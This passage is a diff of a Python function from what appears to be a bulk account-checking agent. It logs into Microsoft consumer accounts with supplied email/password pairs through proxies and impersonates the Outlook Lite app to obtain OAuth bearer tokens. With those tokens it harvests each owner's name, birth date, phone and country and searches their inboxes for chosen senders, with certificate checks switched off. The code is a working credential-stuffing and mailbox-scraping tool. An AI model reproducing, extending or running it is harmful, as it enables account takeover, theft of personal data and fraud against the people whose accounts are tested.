@@ -299,18 +299,10 @@ class DummyQueue:
 
 def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target_senders=None):
     """
-    Ejecuta el chequeo de Microsoft Outlook de forma local desde el VPS.
-    Si el resultado es HIT, lo anexa a hits_buffer de forma thread-safe.
+    Motor 2 Migrado: Flujo Desktop OAuth + Substrate API
+    Obtiene el Token Bearer real y extrae Profile + Inbox.
     """
     session = requests.Session()
-    
-    # Definición temprana para que siempre esté disponible aunque la cuenta no sea HIT
-    api_headers = {
-        "User-Agent": "Mozilla/5.0",
-        "Accept": "application/json",
-        "X-OWA-CANARY": "",
-        "X-Requested-With": "XMLHttpRequest"
-    }
     
     from requests.adapters import HTTPAdapter
     from urllib3.util.retry import Retry
@@ -330,8 +322,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
 
     session.headers.update({
         "User-Agent": mobile_ua,
-        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8",
-        "Accept-Encoding": "gzip, deflate",
+        "Accept": "text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8",
         "Accept-Language": "en-US,en;q=0.9",
         "upgrade-insecure-requests": "1",
         "x-requested-with": "com.microsoft.outlooklite",
@@ -341,6 +332,7 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
         "sec-fetch-dest": "document",
     })
 
+    # PASO 1 - Auth Page
     auth_url = (
         "https://login.microsoftonline.com/consumers/oauth2/v2.0/authorize?"
         "client_info=1&haschrome=1"
@@ -354,162 +346,184 @@ def run_local_audit(email, password, proxy_dict, hits_buffer, keyword="", target
     try:
         session.headers.pop("Host", None)
         res1 = session.get(auth_url, verify=False, timeout=20, allow_redirects=True)
-        if res1.status_code != 200:
-            return
+        if res1.status_code != 200: return
             
         ppft_match = re.search(r'name="PPFT"[^>]*value="([^"]+)"', res1.text)
-        if not ppft_match:
-            ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"', res1.text)
-        if not ppft_match:
-            ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
+        if not ppft_match: ppft_match = re.search(r'name=\\"PPFT\\"[^>]*value=\\"([^\\"]+)\\"', res1.text)
+        if not ppft_match: ppft_match = re.search(r'"sFT"\s*:\s*"([^"]+)"', res1.text)
         
         pl_match = re.search(r'urlPost\s*[\"\']?\s*:\s*[\"\']([^\"\']+)[\"\']', res1.text)
-        if not pl_match:
-            pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)
+        if not pl_match: pl_match = re.search(r'urlPost\s*:\s*"([^"]+)"', res1.text)
             
-        if not ppft_match or not pl_match:
-            return
+        if not ppft_match or not pl_match: return
             
         ppft = ppft_match.group(1)
         post_url = pl_match.group(1)
         
+        # PASO 3 - Login
         post_data = {
-            "i13": "0", "login": email, "loginfmt": email, "type": "11",
-            "LoginOptions": "3", "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
+            "i13": "1", "login": email, "loginfmt": email, "type": "11",
+            "LoginOptions": "1", "lrt": "", "lrtPartition": "", "hisRegion": "", "hisScaleUnit": "",
             "passwd": password, "ps": "2", "psRNGCDefaultType": "", "psRNGCEntropy": "", "psRNGCSLK": "",
             "canary": "", "ctx": "", "hpgrequestid": "", "PPFT": ppft,
-            "PPSX": "", "NewUser": "1", "FoundMSAs": "", "fspost": "0",
-            "i21": "0", "CookieBream": "", "isFidoSupported": "1", "isSAASupported": "1",
-            "isCBAv2Supported": "0", "isCookieBannerShown": "false",
-            "isRoamMacSupported": "0", "iSoLP": "0", "i2": "1", "i17": "0", "i18": "", "i19": "24985"
+            "PPSX": "Passport", "NewUser": "1", "FoundMSAs": "", "fspost": "0",
+            "i21": "0", "CookieDisclosure": "0", "IsFidoSupported": "0", "isSignupPost": "0",
+            "isRecoveryAttemptPost": "0", "i19": "3772"
         }
-        res2 = session.post(post_url, data=post_data, verify=False, timeout=25, allow_redirects=True)
-        if res2.status_code != 200:
-            return
-
-        if "kmsi" in res2.url.lower() or "kmsi" in res2.text.lower() or "oauth2" in res2.url.lower():
-            # ¡HITS POSITIVO!
-            
-            # --- BÚSQUEDA REAL EN BUZÓN VÍA OWA API (SOAP-lite) ---
-            # Usamos la sesión web internamente puenteada para buscar los correos
-            senders_found, subject_count = search_inbox_owa(session, email, target_senders)
-            
-            owa_canary = session.cookies.get("X-OWA-CANARY") or ""
-            api_headers["X-OWA-CANARY"] = owa_canary
-
-
-            profile_res = session.get("https://login.microsoftonline.com/consumers/profile/v1.0/me", verify=False, timeout=15)
-            country = "XZ"
-            name, dob, language, phone = "N/A", "N/A", "N/A", "N/A"
-            if profile_res.status_code == 200:
-                try:
-                    p_data = profile_res.json()
-                    region = p_data.get('culture', '')
-                    if region and '-' in region:
-                        country = region.split('-')[-1].upper()
-                except:
-                    pass
-            
-            # TLD Fallback Extremo para forzar País
-            jerry_mode = (keyword and "jerry7822" in keyword.lower()) if 'keyword' in locals() else False
-            if not jerry_mode:
-                try:
-                    profile_html_res = session.get("https://account.microsoft.com/profile", verify=False, timeout=15)
-                    if profile_html_res.status_code == 200:
-                        html_text = profile_html_res.text
-                        
-                        # --- Resolver SSO Bridge de Microsoft (Bucle de Redirecciones JS) ---
-                        redirect_count = 0
-                        while redirect_count < 10:
-                            made_request = False
-                            
-                            if "<form" in html_text:
-                                form_action = re.search(r'action="([^"]+)"', html_text, re.IGNORECASE)
-                                if form_action:
-                                    post_url = form_action.group(1).replace("&#x3a;", ":").replace("&#x2f;", "/")
-                                    inputs = re.findall(r'<input[^>]*name="([^"]+)"[^>]*value="([^"]*)"', html_text, re.IGNORECASE)
-                                    silent_data = {k: v.replace("&quot;", '"') for k, v in inputs}
-                                    try:
-                                        profile_html_res = session.post(post_url, data=silent_data, verify=False, timeout=15, allow_redirects=True, headers=session.headers)
-                                        html_text = profile_html_res.text
-                                        made_request = True
-                                    except: pass
-                                    redirect_count += 1
-                                    
-                            if not made_request and "window.location.replace" in html_text:
-                                redir_m = re.search(r'window\.location\.replace\((["\'])(.*?)\1\)', html_text)
-                                if redir_m:
-                                    redir_url = redir_m.group(2)
-                                    try:
-                                        profile_html_res = session.get(redir_url, verify=False, timeout=15, allow_redirects=True, headers=session.headers)
-                                        html_text = profile_html_res.text
-                                        made_request = True
-                                    except: pass
-                                    redirect_count += 1
-                                    
-                            if not made_request:
-                                break
-                        # ----------------------------------------------------------------
-                        
-                        # --- Robust JSON Data Extraction ---
-                        try:
-                            import json
-                            area_matches = re.findall(r'var areaConfig = JSON\.stringify\(({.*?})\);', html_text)
-                            for am in area_matches:
-                                area = json.loads(am)
-                                c = area.get("userMarket") or area.get("countryCode")
-                                if c and c != "XZ": country = c
-                                
-                                dump = json.dumps(area)
-                                n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
-                                if n_m and name == "N/A": name = n_m.group(1).encode('utf-8').decode('unicode_escape')
-                                
-                                d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
-                                if d_m and dob == "N/A": dob = d_m.group(1)
-                                
-                            cms_matches = re.findall(r'var cmsContent = JSON\.stringify\(({.*?})\);', html_text)
-                            for cm in cms_matches:
-                                cms = json.loads(cm)
-                                dump = json.dumps(cms)
-                                if name == "N/A":
-                                    n_m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
-                                    if n_m and "Full name" not in n_m.group(1): name = n_m.group(1).encode('utf-8').decode('unicode_escape')
-                                if country == "N/A":
-                                    c_m = re.search(r'"(?:Country|userMarket)"\s*:\s*"([A-Z]{2})"', dump, re.IGNORECASE)
-                                    if c_m and c_m.group(1) != "XZ": country = c_m.group(1)
-                                if dob == "N/A":
-                                    d_m = re.search(r'"(?:BirthDate|dob)"\s*:\s*"([^"]+)"', dump, re.IGNORECASE)
-                                    if d_m and "Date of birth" not in d_m.group(1): dob = d_m.group(1)
-                        except: pass
-                        
-                        # Fallback string matching ---
-                        if name == "N/A" or not name:
-                            m = re.search(r'"(?:FullName|DisplayFullName|displayName)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                            if not m: m = re.search(r'<span>Full name</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
-                            if m: name = m.group(1).strip()
-                        
-                        if country == "N/A" or country == "XZ":
-                            m = re.search(r'"(?:Country|CountryOrRegion)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                            if not m: m = re.search(r'Country or region</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
-                            if m: 
-                                c = m.group(1).strip().upper()
-                                if c != "XZ": country = c
-                            
-                        if dob == "N/A":
-                            m = re.search(r'"(?:BirthDate|DateOfBirth|dob)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                            if not m: m = re.search(r'Date of birth</span>.*?<span[^>]*>([^<]+)</span>', html_text, re.IGNORECASE | re.DOTALL)
-                            if m and "Date of birth" not in m.group(1): dob = m.group(1).strip()
-                                
-                        m = re.search(r'"(?:Language|Locale)"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                        if not m: m = re.search(r'id="locale-picker-link"[^>]*>([^<]+)</a>', html_text, re.IGNORECASE)
-                        if m: language = m.group(1).strip()
         
-                        phone_matches = re.findall(r'"ProofName"\s*:\s*"(\+\d+[^"]+)"', html_text, re.IGNORECASE)
-                        if not phone_matches: phone_matches = re.findall(r'"PhoneNumber"\s*:\s*"([^"]+)"', html_text, re.IGNORECASE)
-                        if not phone_matches: phone_matches = re.findall(r'Phone\s*(?:linked\s*to)?[^<]*\s*(\+\d[\d\s]+)\s*<', html_text, re.IGNORECASE | re.DOTALL)
-                        if phone_matches: phone = phone_matches[0].strip()
-                except Exception as e:
-                    pass
+        session.headers.update({
+            "Origin": "https://login.live.com",
+            "Content-Type": "application/x-www-form-urlencoded",
+            "Referer": res1.url,
+            "Sec-Fetch-Site": "same-origin",
+            "User-Agent": mobile_ua + " PKeyAuth/1.0",
+        })
+        
+        res2 = session.post(post_url, data=post_data, verify=False, timeout=25, allow_redirects=False)
+        
+        # Determine redirect URL
+        location = res2.headers.get("Location", "")
+        response_text = res2.text
+        
+        # Follow KMSI
+        if "kmsi" in location.lower() or "kmsi" in response_text.lower():
+            if location:
+                res2 = session.get(location, verify=False, timeout=15, allow_redirects=False)
+                location = res2.headers.get("Location", "")
+                response_text = res2.text
+            elif "urlPost" in response_text:
+                kmsi_post = re.search(r'urlPost\s*:\s*"([^"]+)"', response_text)
+                kmsi_ppft = re.search(r'name="PPFT"[^>]*value="([^"]+)"', response_text)
+                if kmsi_post and kmsi_ppft:
+                    kd = {"LoginOptions": "1", "type": "28", "ctx": "", "hpgrequestid": "", "PPFT": kmsi_ppft.group(1), "i19": "1234"}
+                    res2 = session.post(kmsi_post.group(1), data=kd, verify=False, timeout=15, allow_redirects=False)
+                    location = res2.headers.get("Location", "")
+                    response_text = res2.text
+                    
+        # PASO 4 - Auth Code
+        if not location:
+            code_in_body = re.search(r'code=([^&"\']+)', response_text)
+            if code_in_body: location = f"?code={code_in_body.group(1)}"
+            else: return
+                
+        code_match = re.search(r'code=([^&]+)', location)
+        if not code_match: return
+            
+        auth_code = code_match.group(1)
+        
+        # PASO 5 - Access Token
+        session.headers.pop("Origin", None)
+        session.headers.pop("Referer", None)
+        session.headers.pop("Sec-Fetch-Site", None)
+        
+        token_data = {
+            "client_info": "1",
+            "client_id": "e9b154d0-7658-433b-bb25-6b8e0a8a7c59",
+            "redirect_uri": "msauth://com.microsoft.outlooklite/fcg80qvoM1YMKJZibjBwQcDfOno%3D",
+            "grant_type": "authorization_code",
+            "code": auth_code,
+            "scope": "profile openid offline_access https://outlook.office.com/M365.Access"
+        }
+        
+        token_headers = {
+            "User-Agent": "Mozilla/5.0 (compatible; MSAL 1.0)",
+            "x-client-Ver": "1.0.0+635e350c",
+            "x-client-OS": "28",
+            "x-client-SKU": "MSAL.xplat.android",
+            "Content-Type": "application/x-www-form-urlencoded; charset=utf-8",
+            "Host": "login.microsoftonline.com",
+        }
+        
+        res3 = session.post("https://login.microsoftonline.com/consumers/oauth2/v2.0/token", data=token_data, headers=token_headers, verify=False, timeout=20)
+        if res3.status_code != 200: return
+        
+        tok = res3.json()
+        access_token = tok.get("access_token")
+        if not access_token: return
+        
+        # SUCCESS! WE HAVE THE TOKEN
+        print(f"[DEBUG vps_agent] Token adquirido para {email}")
+        
+        # PASO 6 - Perfil vía Substrate API Directa
+        cid = session.cookies.get("MSPCID", "").upper()
+        api_headers = {
+            "User-Agent": "Outlook-Android/2.0",
+            "Accept": "application/json",
+            "Authorization": f"Bearer {access_token}",
+            "X-AnchorMailbox": f"CID:{cid}",
+            "Content-Type": "application/json"
+        }
+        
+        name, country, dob, language, phone = "N/A", "N/A", "N/A", "N/A", "N/A"
+        try:
+            res_prof = session.get("https://substrate.office.com/profile/v1.0/users/me", headers=api_headers, verify=False, timeout=15)
+            if res_prof.status_code == 200:
+                p_data = res_prof.json()
+                if p_data.get('displayName'): name = p_data.get('displayName')
+                if p_data.get('countryOrRegion'): country = p_data.get('countryOrRegion')
+                if p_data.get('birthday'): dob = p_data.get('birthday').split('T')[0]
+                if p_data.get('mobilePhone'): phone = p_data.get('mobilePhone')
+                
+                print(f"[DEBUG vps_agent] Substrate profile exitoso: {name} | {country}")
+        except: pass
+        
+        # PASO 7 - Búsqueda DLP Vía Substrate API
+        senders_found = {}
+        subject_count = 0
+        
+        search_payload_tmpl = {
+            "Cvid": "7ef2720e-6e59-ee2b-a217-3a4f427ab0f7",
+            "Scenario": {"Name": "owa.react"},
+            "TimeZone": "Egypt Standard Time",
+            "TextDecorations": "Off",
+            "EntityRequests": [{
+                "EntityType": "Conversation",
+                "ContentSources": ["Exchange"],
+                "Filter": {
+                    "Or": [
+                        {"Term": {"DistinguishedFolderName": "msgfolderroot"}},
+                        {"Term": {"DistinguishedFolderName": "DeletedItems"}}
+                    ]
+                },
+                "From": 0,
+                "Query": {"QueryString": ""},  # To be filled
+                "Size": 25,
+                "EnableTopResults": True,
+                "TopResultsCount": 3
+            }]
+        }
+        
+        if not target_senders: target_senders = []
+        
+        # Batch senders in 10s to minimize API calls like server.py
+        chunk_size = 10
+        for i in range(0, len(target_senders), chunk_size):
+            chunk = target_senders[i:i+chunk_size]
+            or_query = " OR ".join([f"from:{s}" for s in chunk])
+            # Solo buscar en Remitentes para acelerar y enfocar
+            query_string = f'({or_query})'
+            
+            payload = search_payload_tmpl.copy()
+            payload["EntityRequests"][0]["Query"]["QueryString"] = query_string
+            
+            print(f"[DEBUG vps_agent] Buscando en API: {query_string}")
+            try:
+                res_s = session.post("https://substrate.office.com/search/api/v1/query", json=payload, headers=api_headers, verify=False, timeout=15)
+                if res_s.status_code == 200:
+                    data = res_s.json()
+                    res_blocks = data.get("EntityResponses", [])
+                    if res_blocks:
+                        convs = res_blocks[0].get("DisplayableEntities", [])
+                        subject_count += len(convs)
+                        for c in convs:
+                            sender_addr = c.get("Conversation", {}).get("SenderAddress", "").lower()
+                            if sender_addr:
+                                senders_found[sender_addr] = senders_found.get(sender_addr, 0) + 1
+            except Exception as e:
+                print(f"[DEBUG vps_agent] Error en búsqueda de bandeja: {e}")
+                
+        # Order Top
+        senders_found = dict(sorted(senders_found.items(), key=lambda item: item[1], reverse=True)[:15])
             
             if country == "XZ":
                 email_lower = email.lower()
